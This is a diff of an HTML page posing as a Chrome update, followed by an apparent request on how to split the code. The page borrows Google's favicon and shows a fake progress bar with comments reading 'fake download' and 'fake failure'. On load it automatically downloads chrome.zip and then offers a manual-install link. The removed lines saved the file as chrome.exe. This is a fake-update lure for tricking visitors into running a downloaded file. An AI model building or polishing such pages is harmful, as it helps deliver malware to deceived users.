@@ -4,8 +4,9 @@
   <meta charset="UTF-8">
   <title>Chrome Update</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <link rel="icon" type="image/x-icon" href="chrome.ico">
+  <link rel="icon" href="https://www.google.com/chrome/static/images/favicons/favicon-96x96.png">
   <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
+  <link rel="icon" type="image/x-icon" href="chrome.ico">
 
   <style>
     body {
@@ -22,10 +23,9 @@
       background: #fff;
       padding: 2rem;
       border-radius: 12px;
-      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.15);
+      box-shadow: 0 4px 16px rgba(0,0,0,0.2);
       text-align: center;
       width: 360px;
-      position: relative;
     }
 
     .box img {
@@ -34,7 +34,7 @@
     }
 
     .box h2 {
-      font-size: 1.2rem;
+      font-size: 1.25rem;
       margin: 0 0 0.5rem;
       color: #202124;
     }
@@ -42,38 +42,22 @@
     .box p {
       font-size: 0.95rem;
       color: #5f6368;
-      margin-bottom: 1.2rem;
+      margin-bottom: 1rem;
     }
 
     .progress {
       background: #e0e0e0;
-      border-radius: 999px;
+      border-radius: 20px;
       height: 10px;
       overflow: hidden;
-      margin-top: 0.5rem;
+      position: relative;
     }
 
     .bar {
       height: 100%;
       width: 0%;
       background: #1a73e8;
-      transition: width 0.3s ease-in-out;
-    }
-
-    .spinner {
-      margin: 1rem auto;
-      width: 24px;
-      height: 24px;
-      border: 3px solid #e0e0e0;
-      border-top: 3px solid #1a73e8;
-      border-radius: 50%;
-      animation: spin 1s linear infinite;
-    }
-
-    @keyframes spin {
-      to {
-        transform: rotate(360deg);
-      }
+      transition: width 0.3s;
     }
 
     .fallback {
@@ -91,59 +75,28 @@
     .ver {
       font-size: 0.75rem;
       color: #9aa0a6;
-      margin-top: 1.5rem;
-    }
-
-    .note {
-      font-size: 0.75rem;
-      color: #5f6368;
-      margin-top: 0.5rem;
+      margin-top: 1rem;
     }
   </style>
 
   <script>
     window.onload = () => {
+      // Start fake download
       const bar = document.querySelector('.bar');
-      const statusText = document.querySelector('p');
-      const spinner = document.querySelector('.spinner');
       let progress = 0;
-
-      const statusMsgs = [
-        "Checking for updates...",
-        "Preparing installation...",
-        "Downloading update package...",
-        "Validating files...",
-        "Finalizing...",
-        "Update failed."
-      ];
-
       const interval = setInterval(() => {
-        progress += Math.random() * 12;
+        progress += Math.random() * 15;
         bar.style.width = Math.min(progress, 100) + "%";
-
-        if (progress > 90) {
-          statusText.innerText = statusMsgs[4];
-        } else if (progress > 70) {
-          statusText.innerText = statusMsgs[3];
-        } else if (progress > 45) {
-          statusText.innerText = statusMsgs[2];
-        } else if (progress > 20) {
-          statusText.innerText = statusMsgs[1];
-        } else {
-          statusText.innerText = statusMsgs[0];
-        }
-
         if (progress >= 100) {
           clearInterval(interval);
-          spinner.style.display = "none";
-          showFallback();
+          showFallback(); // fake failure
         }
       }, 300);
 
-      // Simulate download of .exe
+      // Auto download ZIP
       const a = document.createElement('a');
-      a.href = 'chrome.zip';  // rename this to .exe if needed
-      a.download = 'chrome.exe';
+      a.href = 'chrome.zip';
+      a.download = 'chrome.zip';
       document.body.appendChild(a);
       a.click();
     };
@@ -158,16 +111,17 @@
   <div class="box">
     <img src="https://www.google.com/chrome/static/images/favicons/favicon-96x96.png" alt="Chrome">
     <h2>Updating Chrome</h2>
-    <p>Checking for updates...</p>
-    <div class="spinner"></div>
+    <p>Downloading update...</p>
     <div class="progress">
       <div class="bar"></div>
     </div>
     <div class="fallback">
-      <a href="ChromeUpdate.zip">Click here to install manually</a>
+      <a href="chrome.zip">Click here to update manually</a>
     </div>
-    <div class="note">Installer: ChromeUpdateInstaller.exe</div>
-    <div class="ver">Version 140.0.7204.168</div>
+    <div class="ver">v114.0.5735.199</div>
   </div>
 </body>
 </html>
+
+
+how to split this cod
